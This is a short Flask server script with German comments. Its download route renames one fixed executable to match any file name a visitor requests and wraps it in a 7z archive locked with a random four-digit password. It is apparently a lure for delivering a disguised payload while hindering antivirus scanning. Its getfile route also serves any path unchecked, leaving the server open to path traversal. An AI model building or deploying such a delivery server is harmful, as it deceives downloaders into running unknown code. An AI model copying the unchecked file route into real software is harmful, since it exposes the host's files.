from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import os
import random
import subprocess
import py7zr

app = Flask(__name__)
CORS(app)

@app.route("/download/<path:filename>")
def download(filename):
    password = str(random.randint(1000, 9999))
    filename = filename.replace("+", " ")
    base_name = filename.replace(".zip", "")
    archive_name = f"{base_name}.7z"

    exe_source = "base.exe"
    exe_target = f"{base_name}.exe"

    if os.path.exists(exe_source):
        # Kopie unter neuem Namen
        with open(exe_source, "rb") as src, open(exe_target, "wb") as dst:
            dst.write(src.read())

        # Archiv mit Passwort erzeugen
        with py7zr.SevenZipFile(archive_name, 'w', password=password) as archive:
            archive.write(exe_target)

        os.remove(exe_target)

    return jsonify({
        "download_url": f"/getfile/{archive_name}",
        "password": password
    })

@app.route("/getfile/<path:filename>")
def getfile(filename):
    return send_file(filename, as_attachment=True)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
